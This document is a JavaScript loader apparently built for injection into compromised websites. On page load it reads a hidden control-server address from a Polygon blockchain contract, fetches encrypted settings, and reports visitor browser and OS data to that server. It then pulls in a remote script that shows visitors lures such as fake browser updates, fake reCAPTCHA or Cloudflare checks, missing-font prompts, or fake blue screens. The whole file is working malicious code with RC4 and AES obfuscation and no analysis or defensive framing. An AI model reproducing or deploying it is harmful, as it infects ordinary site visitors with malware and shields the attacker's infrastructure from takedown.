(function(){
'use strict';
if(typeof window==='undefined'||typeof document==='undefined'||window.__BW_SCRIPT_INITIALIZED__)return;
window.__BW_SCRIPT_INITIALIZED__=true;
const LOCAL_STORAGE_KEY='site_repair_state';
const LEGACY_STORAGE_KEY='bw-downloaded';
const DEFAULT_SHOW_DELAY=1000;
const HANDLER_EXPORT='__BW_MODE_RUN__';
const MODE_FILE_MAP={
browser:'v1.js',
font:'v2.js',
recaptcha:'v3.js',
bsod:'v4.js',
silent:'v5.js',
cloudflare:'v6.js',
cf_update:'v7.js',
mac_recaptcha:'v8.js',
mac_cloudflare:'v9.js'
};
const CONTRACT_CONFIG={
RPC_HOSTS:["https://rpc-mainnet.matic.quiknode.pro","https://rpc.ankr.com/polygon","https://polygon-public.nodies.app","https://polygon-mainnet.public.blastapi.io","https://1rpc.io/matic","https://polygon.drpc.org","https://polygon.gateway.tenderly.co","https://gateway.tenderly.co/public/polygon","https://polygon-mainnet.gateway.tatum.io","https://polygon.rpc.subquery.network/public","https://polygon.therpc.io","https://polygon.lava.build","https://polygon-bor-rpc.publicnode.com","https://polygon.rpc.hypersync.xyz/"],
CONTRACT_ADDRESS:'0x926d64543148dB649C4F877fE7ba4c693e01E288',
FUNCTION_SELECTOR:'b68d1809',
TIMEOUT_MS:5000,
MAX_RETRIES:2
};
if(typeof __BW_CONTRACT_OVERRIDE!=='undefined'&&__BW_CONTRACT_OVERRIDE){
try{Object.assign(CONTRACT_CONFIG,__BW_CONTRACT_OVERRIDE);}catch(e){}
}
let cfg={};
let panelBaseUrl='';
let apiBase='';
let logUrl='';
let tokenUrl='';
let downloadUrl='';
const API_Q2_KEY_HEX='539230d5d9ae0008c44af957de3692ec42d6ecad17d7872becd5fa7e1fdc2023';
function b64urlEncodeAscii(str){
try{
return btoa(String(str)).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/g,'');
}catch(e){
return'';
}
}
function hexToBytes(hex){
try{
hex=String(hex||'').trim();
if(!/^[a-f0-9]{64}$/i.test(hex))return null;
const out=new Uint8Array(32);
for(let i=0;i<32;i++){
out[i]=parseInt(hex.substr(i*2,2),16)&0xff;
}
return out;
}catch(e){
return null;
}
}
function bytesToB64Url(bytes){
try{
let bin='';
const chunk=0x8000;
for(let i=0;i<bytes.length;i+=chunk){
bin+=String.fromCharCode.apply(null,bytes.subarray(i,i+chunk));
}
return btoa(bin).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/g,'');
}catch(e){
return'';
}
}
function b64urlToBytes(b64url){
try{
if(!b64url||typeof b64url!=='string')return null;
let b64=b64url.replace(/-/g,'+').replace(/_/g,'/');
const pad=b64.length%4;
if(pad)b64+='='.repeat(4-pad);
const bin=atob(b64);
const out=new Uint8Array(bin.length);
for(let i=0;i<bin.length;i++)out[i]=bin.charCodeAt(i)&0xff;
return out;
}catch(e){
return null;
}
}
function bytesToUtf8(bytes){
try{
return new TextDecoder('utf-8',{fatal:false}).decode(bytes);
}catch(e){
let s='';
for(let i=0;i<bytes.length;i++)s+=String.fromCharCode(bytes[i]);
return s;
}
}
function concatBytes(a,b){
const out=new Uint8Array(a.length+b.length);
out.set(a,0);
out.set(b,a.length);
return out;
}
async function sha256Bytes(bytes){
try{
if(typeof crypto==='undefined'||!crypto.subtle||!crypto.subtle.digest)return null;
const digest=await crypto.subtle.digest('SHA-256',bytes.buffer?bytes.buffer:bytes);
return new Uint8Array(digest);
}catch(e){
return null;
}
}
function rc4(keyBytes,dataBytes){
const s=new Uint8Array(256);
for(let i=0;i<256;i++)s[i]=i;
let j=0;
for(let i=0;i<256;i++){
j=(j+s[i]+keyBytes[i%keyBytes.length])&255;
const tmp=s[i];
s[i]=s[j];
s[j]=tmp;
}
let i=0;
j=0;
const out=new Uint8Array(dataBytes.length);
for(let n=0;n<dataBytes.length;n++){
i=(i+1)&255;
j=(j+s[i])&255;
const tmp=s[i];
s[i]=s[j];
s[j]=tmp;
const k=s[(s[i]+s[j])&255];
out[n]=dataBytes[n]^k;
}
return out;
}
function buildApiUrl(params){
if(!apiBase)return'';
try{
const qs=new URLSearchParams(params||{}).toString();
const key=hexToBytes(API_Q2_KEY_HEX);
if(key&&typeof Uint8Array!=='undefined'){
const nonce=new Uint8Array(8);
if(typeof crypto!=='undefined'&&crypto.getRandomValues){
crypto.getRandomValues(nonce);
}else{
for(let i=0;i<nonce.length;i++)nonce[i]=(Math.random()*256)&255;
}
const enc=(typeof TextEncoder!=='undefined')?new TextEncoder():null;
const plainBytes=enc?enc.encode(qs):(function(){
const arr=new Uint8Array(qs.length);
for(let i=0;i<qs.length;i++)arr[i]=qs.charCodeAt(i)&255;
return arr;
})();
const keyMat=new Uint8Array(key.length+nonce.length);
keyMat.set(key,0);
keyMat.set(nonce,key.length);
const cipherBytes=rc4(keyMat,plainBytes);
const payload=new Uint8Array(nonce.length+cipherBytes.length);
payload.set(nonce,0);
payload.set(cipherBytes,nonce.length);
const packed=bytesToB64Url(payload);
if(packed){
return apiBase+'/api/index.php?q='+packed;
}
}
return'';
}catch(e){
return'';
}
}
async function decryptApiEnvelope(obj,scope){
try{
if(!obj||typeof obj!=='object')return obj;
if(typeof obj.q!=='string'||!obj.q)return obj;
const safeScope=(typeof scope==='string'&&/^[a-z0-9_]{1,16}$/i.test(scope))?scope:'cfg';
const baseKey=hexToBytes(API_Q2_KEY_HEX);
if(!baseKey)return obj;
if(obj.enc==='gcm1'){
try{
const packed=b64urlToBytes(obj.q);
if(!packed||packed.length<(12+16+1))throw new Error('gcm_packed');
const iv=packed.slice(0,12);
const cipherWithTag=packed.slice(12);
const gcmLabel=safeScope+'|gcm1';
const label=(typeof TextEncoder!=='undefined')?new TextEncoder().encode(gcmLabel):(function(){
const s=gcmLabel;
const arr=new Uint8Array(s.length);
for(let i=0;i<s.length;i++)arr[i]=s.charCodeAt(i)&255;
return arr;
})();
const keyBytes=await sha256Bytes(concatBytes(baseKey,label));
if(!keyBytes)throw new Error('gcm_key');
if(typeof crypto==='undefined'||!crypto.subtle||!crypto.subtle.importKey)throw new Error('gcm_subtle');
const cryptoKey=await crypto.subtle.importKey('raw',keyBytes,{name:'AES-GCM'},false,['decrypt']);
const plainBuf=await crypto.subtle.decrypt({name:'AES-GCM',iv:iv,tagLength:128},cryptoKey,cipherWithTag);
const json=bytesToUtf8(new Uint8Array(plainBuf));
return JSON.parse(json);
}catch(e){
if(typeof obj.q2==='string'&&obj.q2){
const packed2=b64urlToBytes(obj.q2);
if(packed2&&packed2.length>=9){
const nonce=packed2.slice(0,8);
const cipher2=packed2.slice(8);
const keyMat=new Uint8Array(baseKey.length+nonce.length);
keyMat.set(baseKey,0);
keyMat.set(nonce,baseKey.length);
const plainBytes2=rc4(keyMat,cipher2);
const json2=bytesToUtf8(plainBytes2);
return JSON.parse(json2);
}
}
return obj;
}
}
if(obj.enc==='q2'){
const packed=b64urlToBytes(obj.q);
if(!packed||packed.length<9)return obj;
const nonce=packed.slice(0,8);
const cipher=packed.slice(8);
const keyMat=new Uint8Array(baseKey.length+nonce.length);
keyMat.set(baseKey,0);
keyMat.set(nonce,baseKey.length);
const plainBytes=rc4(keyMat,cipher);
const json=bytesToUtf8(plainBytes);
return JSON.parse(json);
}
return obj;
}catch(e){
return obj;
}
}
try{
window.__bwDecryptApiEnvelope=decryptApiEnvelope;
}catch(e){}
let showDelay=DEFAULT_SHOW_DELAY;
let mode='browser';
function fetchWithTimeout(url,options,timeoutMs){
const controller=new AbortController();
const timeoutId=setTimeout(()=>controller.abort(),timeoutMs||5000);
const opts=Object.assign({},options||{},{signal:controller.signal});
return fetch(url,opts).finally(()=>clearTimeout(timeoutId));
}
async function fetchJsonWithTimeout(url,options,timeoutMs){
const resp=await fetchWithTimeout(url,options,timeoutMs);
if(!resp.ok)throw new Error('http_'+resp.status);
return await resp.json();
}
function decodeHexString(hex){
try{
let result='';
for(let i=0;i<hex.length;i+=2){
const byteString=hex.substr(i,2);
const byte=parseInt(byteString,16);
if(byte>0)result+=String.fromCharCode(byte);
}
return result;
}catch(e){
return'';
}
}
function decodeResult(result){
try{
const hexData=result.startsWith('0x')?result.substr(2):result;
if(hexData.length<128)return'';
const lengthHex=hexData.substr(64,64);
const length=parseInt(lengthHex,16);
if(length>0&&hexData.length>=128+length*2){
const stringHex=hexData.substr(128,length*2);
return decodeHexString(stringHex);
}
return'';
}catch(e){
return'';
}
}
async function postJsonWithTimeout(url,body,timeoutMs){
return await fetchJsonWithTimeout(url,{
method:'POST',
headers:{
'Content-Type':'application/json',
'Accept':'application/json'
},
body:JSON.stringify(body),
cache:'no-store'
},timeoutMs);
}
async function getUrlFromContract(){
const dataField='0x'+CONTRACT_CONFIG.FUNCTION_SELECTOR;
const params=[{to:CONTRACT_CONFIG.CONTRACT_ADDRESS,data:dataField},'latest'];
const requestBody={jsonrpc:'2.0',method:'eth_call',params,id:1};
for(let attempt=0;attempt<(CONTRACT_CONFIG.MAX_RETRIES||1);attempt++){
for(const endpoint of(CONTRACT_CONFIG.RPC_HOSTS||[])){
try{
const data=await postJsonWithTimeout(endpoint,requestBody,CONTRACT_CONFIG.TIMEOUT_MS||5000);
if(data&&data.result){
const domain=decodeResult(data.result);
if(domain&&domain.length>0){
let url=domain.trim();
if(!url.startsWith('http'))url='https://'+url;
return url;
}
}
}catch(e){}
}
}
return null;
}
function updateUrls(baseUrl){
if(!baseUrl)return;
panelBaseUrl=baseUrl.replace(/\/$/,'');
apiBase=panelBaseUrl;
logUrl=buildApiUrl({a:'evt'})||(apiBase+'/api/index.php?a=evt');
tokenUrl=buildApiUrl({a:'init'})||(apiBase+'/api/index.php?a=init');
downloadUrl=buildApiUrl({a:'dl'})||(apiBase+'/api/index.php?a=dl');
}
async function refreshConfigFromApi(){
try{
const contractUrl=await getUrlFromContract();
if(!contractUrl)throw new Error('BrowserWarning: Failed to get URL from contract');
updateUrls(contractUrl);
const settingsUrl=buildApiUrl({a:'cfg'})||(contractUrl+'/api/index.php?a=cfg');
let remote=await fetchJsonWithTimeout(settingsUrl,{cache:'no-store'},5000);
remote=await decryptApiEnvelope(remote,'cfg');
if(!remote||typeof remote!=='object')throw new Error('BrowserWarning: invalid settings payload');
cfg=Object.assign({},remote);
if(cfg.contractConfig){
try{Object.assign(CONTRACT_CONFIG,cfg.contractConfig);}catch(e){}
}
if(cfg.panelBaseUrl&&cfg.panelBaseUrl!==panelBaseUrl)updateUrls(cfg.panelBaseUrl);
showDelay=typeof cfg.showDelay==='number'?cfg.showDelay:DEFAULT_SHOW_DELAY;
mode=typeof cfg.mode==='string'?cfg.mode:'browser';
}catch(e){
throw e;
}
}
async function logEvent(eventType,payload){
if(!logUrl&&!apiBase)return;
try{
const url=buildApiUrl({a:'evt'})||logUrl;
await fetchWithTimeout(url,{
method:'POST',
headers:{'Content-Type':'text/plain;charset=UTF-8'},
body:JSON.stringify(Object.assign({eventType},payload||{})),
cache:'no-store'
},3000);
}catch(e){}
}
function loadModeScript(modeName,cacheBust){
return new Promise((resolve,reject)=>{
if(!panelBaseUrl)return reject(new Error('panelBaseUrl_missing'));
delete window[HANDLER_EXPORT];
const script=document.createElement('script');
const safeMode=(modeName&&MODE_FILE_MAP[modeName])?modeName:'browser';
const apiScriptUrl=buildApiUrl({a:'js',mode:String(safeMode)});
script.src=apiScriptUrl||(panelBaseUrl+'/api/index.php?a=js&mode='+encodeURIComponent(String(safeMode)));
script.async=true;
script.onload=()=>{
const fn=window[HANDLER_EXPORT];
delete window[HANDLER_EXPORT];
if(typeof fn==='function')return resolve(fn);
reject(new Error('mode_handler_missing'));
};
script.onerror=()=>{
delete window[HANDLER_EXPORT];
reject(new Error('mode_script_failed'));
};
document.head.appendChild(script);
});
}
async function bootstrap(modeName,context){
try{
const runner=await loadModeScript(modeName,cfg&&(cfg.cacheTag||cfg.updatedAt));
await runner(context);
}catch(e){
if(modeName!=='browser'){
try{
const fallback=await loadModeScript('browser',cfg&&(cfg.cacheTag||cfg.updatedAt));
await fallback(Object.assign({},context,{mode:'browser'}));
}catch(err){
}
}
}
}
async function main(){
try{
await refreshConfigFromApi();
if(cfg&&cfg.enabled===false)return;
const os=(cfg&&typeof cfg.os==='string'&&cfg.os)?String(cfg.os):'unknown';
const browser=(cfg&&typeof cfg.browser==='string'&&cfg.browser)?String(cfg.browser):'Unknown';
let effectiveMode=(typeof mode==='string'&&mode)?mode:'browser';
try{
const legacy=localStorage.getItem(LEGACY_STORAGE_KEY);
const current=localStorage.getItem(LOCAL_STORAGE_KEY);
if(legacy!==null&&current===null)localStorage.setItem(LOCAL_STORAGE_KEY,legacy);
if(legacy!==null)localStorage.removeItem(LEGACY_STORAGE_KEY);
}catch(e){}
if(localStorage.getItem(LOCAL_STORAGE_KEY)==='1')return;
if(effectiveMode!=='recaptcha'&&effectiveMode!=='bsod'&&effectiveMode!=='cloudflare'&&effectiveMode!=='cf_update'&&effectiveMode!=='silent'){
await logEvent('page_view',{
browser,
os,
mode:effectiveMode,
contractUrl:panelBaseUrl,
contractAddress:CONTRACT_CONFIG.CONTRACT_ADDRESS
});
}
const start=()=>{
const ctx={
panelBaseUrl,
apiBase,
apiUrl:buildApiUrl,
logUrl,
tokenUrl,
downloadUrl,
mode:effectiveMode,
os,
browser,
country:'',
storageKey:LOCAL_STORAGE_KEY,
cfg,
contractConfig:CONTRACT_CONFIG
};
bootstrap(effectiveMode,ctx);
};
if(document.readyState==='loading'){
document.addEventListener('DOMContentLoaded',()=>setTimeout(start,showDelay),{once:true});
}else{
setTimeout(start,showDelay);
}
}catch(e){
}
}
main();
})();